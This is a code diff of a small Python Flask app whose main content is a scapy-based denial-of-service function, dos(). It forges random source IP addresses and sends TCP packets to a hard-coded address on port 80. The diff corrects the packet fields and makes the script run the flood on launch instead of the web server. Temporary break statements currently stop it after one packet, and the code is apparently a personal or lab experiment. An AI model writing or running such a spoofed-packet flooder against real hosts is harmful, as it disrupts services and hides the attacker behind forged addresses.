@@ -1,9 +1,12 @@
+
 import os
+# print (os.sys.path)
 from flask import Flask, render_template, request
 from werkzeug.utils import secure_filename
 app = Flask(__name__)
 
 import config
+
 print (config.target_IP)
 
 import random
@@ -14,9 +17,11 @@ from scapy.all import *
 # pkts_list = rdpcap("pacp/http.cap")
 
 def dos():
-    target_IP = config.target_IP
-    i = 1
-    while True:
+   global config
+
+   target_IPs = "192.168.8.1"
+   i = 1
+   while True:
       a = str(random.randint(1,254))
       b = str(random.randint(1,254))
       c = str(random.randint(1,254))
@@ -25,12 +30,14 @@ def dos():
       Source_ip = a + dot + b + dot + c + dot + d
         
       for source_port in range(1, 65535):
-         IP1 = IP(source_IP = Source_ip, destination = target_IP)
-         TCP1 = TCP(srcport = source_port, dstport = 80)
-         pkt = IP1 / TCP1
+         IP1 = IP(src= Source_ip, dst = target_IPs)
+         #TCP1 = TCP(sport = source_port, dport = 80)
+         pkt = IP1 / TCP()
          send(pkt,inter = .001)
          print ("packet sent ", i)
          i = i + 1
+         break
+      break
 
 # @app.route('/upload')
 # def upload_file():
@@ -59,7 +66,10 @@ def test():
     return "Welcome"
 
 if __name__ == '__main__':
-   app.run(host='0.0.0.0',debug = True)
+   #pass
+   dos()
+   print(sr1(IP(dst="4.2.2.1")/ICMP()).summary())
+   # app.run(host='0.0.0.0',debug = True)
 
 
 
